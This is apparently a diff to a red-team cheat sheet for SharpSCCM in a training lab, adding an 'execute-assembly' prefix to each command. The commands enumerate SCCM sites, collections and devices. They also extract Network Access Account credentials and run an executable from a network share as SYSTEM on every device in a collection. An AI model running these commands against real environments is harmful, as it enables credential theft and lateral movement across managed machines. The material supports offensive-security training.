@@ -8,7 +8,7 @@
 Enumerates SCCM.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
 ```
 
 
@@ -19,7 +19,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner
 Checks DACL for machines that have full control over the AD.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
 ```
 
 
@@ -30,7 +30,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no
 Enumerates all the collections available in the groups the current user is in.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
 ```
 
 
@@ -41,7 +41,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner
 Enumerates the members of a certain collection.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner
 ```
 
 
@@ -52,7 +52,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-
 Enumerates devices.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
 ```
 
 ### For User
@@ -60,7 +60,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p Ful
 `-u` will only return devices where the given user was the last to login.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
 ```
 
 
@@ -71,7 +71,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses
 Returns the class instances of a collection.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner
 ```
 
 
@@ -82,7 +82,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-
 Returns the Network Access Account Credentials.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
 ```
 
 
@@ -93,7 +93,7 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
 Executes commands on every device in a collection.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
 ```
 
 ### Force SYSTEM
@@ -101,5 +101,5 @@ C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.e
 `-s` forces the command to run with SYSTEM privileges.
 
 ```
-C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
+execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
 ```
